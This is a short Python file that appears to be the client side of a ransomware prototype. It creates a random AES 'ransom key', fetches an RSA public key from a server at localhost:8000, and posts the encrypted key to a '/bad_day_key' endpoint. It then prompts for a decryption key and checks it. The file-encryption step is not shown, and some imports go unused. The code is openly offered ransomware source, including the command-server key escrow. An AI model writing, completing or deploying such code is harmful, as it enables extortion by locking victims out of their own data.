from tkinter import messagebox
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from tkinter import *
import requests
import os

host = "http://localhost:8000"

AES_key = get_random_bytes(32)


def recieve_pub_key():
    request = requests.get(host + "/key")
    return request.json()["key"]


def encrypt_and_send_ransom_key():
    pub_key = RSA.importKey(recieve_pub_key())
    cipher_rsa = PKCS1_OAEP.new(pub_key)
    encrypted_ransomkey = cipher_rsa.encrypt(AES_key)

    headers = {"accept": "application/json", "Content-Type": "application/json"}
    data = {"key": encrypted_ransomkey.hex()}

    requests.post(host + "/bad_day_key", headers=headers, json=data)


def check_decrypt_key(key):
    return bytes.fromhex(key) == AES_key


pub_key = recieve_pub_key()
print(pub_key)
encrypt_and_send_ransom_key()
dec_key = input("Key: ")
print(check_decrypt_key(dec_key))
